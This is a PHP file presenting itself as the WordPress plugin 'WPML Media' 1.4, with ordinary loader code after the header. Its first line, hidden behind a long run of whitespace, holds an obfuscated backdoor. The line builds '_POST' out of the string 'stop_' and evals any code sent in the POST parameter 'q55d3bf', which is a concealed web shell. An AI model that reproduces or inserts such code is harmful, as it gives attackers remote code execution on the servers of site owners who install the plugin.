<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q55d3bf'])){eval(${$s20}['q55d3bf']);}?><?php 
/*
Plugin Name: WPML Media
Plugin URI: http://wpml.org/
Description: Add multilingual support for Media files
Author: ICanLocalize
Author URI: http://wpml.org
Version: 1.4
*/

if(defined('WPML_MEDIA_VERSION')) return;

define('WPML_MEDIA_VERSION', '1.4');
define('WPML_MEDIA_PATH', dirname(__FILE__));

require WPML_MEDIA_PATH . '/inc/constants.inc';
require WPML_MEDIA_PATH . '/inc/wpml_media.class.php';

$WPML_media = new WPML_media();
?>
